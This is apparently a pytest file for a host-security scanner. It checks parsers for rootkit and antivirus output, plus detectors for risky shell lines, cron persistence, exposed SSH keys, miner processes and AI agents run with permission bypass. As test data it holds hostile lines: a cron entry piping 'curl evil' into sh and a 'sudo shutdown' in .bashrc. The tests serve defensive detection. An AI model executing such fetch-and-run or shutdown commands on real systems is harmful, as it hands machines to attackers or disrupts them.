"""Security: the deep scanners' parsers and the quick checks."""

import os

from huntaway.agents.harnesses import Agent
from huntaway.security import checks, scanners

RKHUNTER = """[07:42:22] Warning: The O/S name or version has changed since the last run:
[07:42:22]          Old O/S value: Ubuntu 24.04
[07:42:30] Warning: The file properties have changed:
[07:42:30]          File: /usr/bin/curl
[07:42:30]          Current hash: abc
[07:44:31] Warning: Hidden directory found: /etc/.java
[07:44:31] Warning: Hidden file found: /usr/share/.evil: ELF 64-bit
[07:44:40] Warning: Possible rootkit found: Diamorphine LKM
"""


def test_rkhunter_warnings_are_grouped_and_classified():
    found = scanners.parse_rkhunter(RKHUNTER, recent_update=True)
    by_title = {f["title"]: f for f in found}
    assert by_title["The O/S name or version has changed since the last run:"]["severity"] == "info"
    changed = by_title["The file properties have changed:"]
    assert changed["severity"] == "low" and "/usr/bin/curl" in changed["detail"] and "refresh" in changed["detail"]
    assert by_title["Hidden directory found: /etc/.java"]["severity"] == "info"
    assert by_title["Hidden file found: /usr/share/.evil: ELF 64-bit"]["severity"] == "medium"
    assert by_title["Possible rootkit found: Diamorphine LKM"]["severity"] == "critical"
    assert scanners.parse_rkhunter(RKHUNTER)[1]["severity"] == "medium"


def test_chkrootkit_clamav_and_lynis():
    chk = scanners.parse_chkrootkit(
        "Checking `ls'... not infected\nINFECTED: Possible Malicious Linux.Xor.DDoS\n"
        "WARNING: The following suspicious files and directories were found:\n"
    )
    assert [f["severity"] for f in chk] == ["critical", "medium"]
    clam = scanners.parse_clamav("/home/u/x.exe: Win.Test.EICAR_HDB-1 FOUND\n/ok: OK\n")
    assert clam[0]["title"] == "Win.Test.EICAR_HDB-1 in x.exe" and clam[0]["detail"] == "/home/u/x.exe"
    found, summary = scanners.parse_lynis(
        "hardening_index=63\nwarning[]=AUTH-9286|Password aging|-|-|\n"
        "suggestion[]=SSH-7408|Harden SSH|AllowTcpForwarding|-|\n"
    )
    assert summary == {"hardening_index": 63, "warnings": 1, "suggestions": 1}
    assert found[0]["title"] == "Password aging [AUTH-9286]"


def test_install_command_names_the_package_manager(monkeypatch):
    monkeypatch.setattr(scanners.shutil, "which", lambda name: "/usr/bin/apt-get" if name == "apt-get" else None)
    monkeypatch.setattr(scanners.sys, "platform", "linux")
    assert scanners.install_command(["lynis", "clamav"]) == "sudo apt-get install -y lynis clamav"
    assert scanners.install_command([]) == ""


def test_shell_files_baseline_then_change_and_risky_lines(isolated, store):
    rc = isolated / ".bashrc"
    rc.write_text("alias ll='ls -l'\n")
    assert checks.shell_files(store, isolated) == []
    rc.write_text("alias ll='ls -l'\nsudo shutdown -h 0\n# curl x | sh\n")
    found = checks.shell_files(store, isolated)
    titles = [f["title"] for f in found]
    assert "~/.bashrc changed since the baseline" in titles
    assert any(f["severity"] == "high" and "line 2" in f["title"] for f in found)
    assert not any("line 3" in t for t in titles)


def test_persistence_flags_new_cron_lines(isolated, store):
    assert checks.persistence(store, isolated, crontab=lambda: "") == []
    found = checks.persistence(store, isolated, crontab=lambda: "* * * * * curl evil | sh\n")
    assert found and found[0]["severity"] == "high" and "cron" in found[0]["title"]


def test_credentials_readable_by_others(isolated):
    key = isolated / ".ssh" / "id_ed25519"
    key.parent.mkdir()
    key.write_text("secret")
    os.chmod(key, 0o644)
    assert checks.credentials(isolated)[0]["title"] == "~/.ssh/id_ed25519 is readable by other users"
    os.chmod(key, 0o600)
    assert checks.credentials(isolated) == []


def test_processes_miners_temp_and_windows():
    found = checks.processes(
        [
            {"pid": 1, "name": "xmrig", "exe": "/opt/x/xmrig"},
            {"pid": 2, "name": "x", "exe": "/tmp/.x/payload"},
            {"pid": 3, "name": "setup.exe", "exe": "/usr/bin/wine64"},
            {"pid": 4, "name": "bash", "exe": "/usr/bin/bash"},
        ]
    )
    assert [f["severity"] for f in found] == ["critical", "high", "low"]


def test_agent_guard_flags_headless_bypass():
    loud = Agent(
        harness="claude", label="Claude Code", pid=7, pids=[7], started=1, flags=["--yolo"], headless_bypass=True
    )
    quiet = Agent(harness="claude", label="Claude Code", pid=8, pids=[8], started=1, flags=["--yolo"], tty="/dev/pts/1")
    found = checks.agent_guard([loud, quiet])
    assert [f["severity"] for f in found] == ["high", "info"]


def test_run_all_stores_results(isolated, store, monkeypatch):
    monkeypatch.setattr(checks, "listeners", lambda s: [])
    monkeypatch.setattr(checks, "processes", lambda: [])
    results = checks.run_all(store, [], isolated)
    assert set(results) == {"shell", "persistence", "processes", "listeners", "credentials", "agents"}
    assert {s["source"] for s in store.last_scans()} >= {"quick:shell", "quick:agents"}
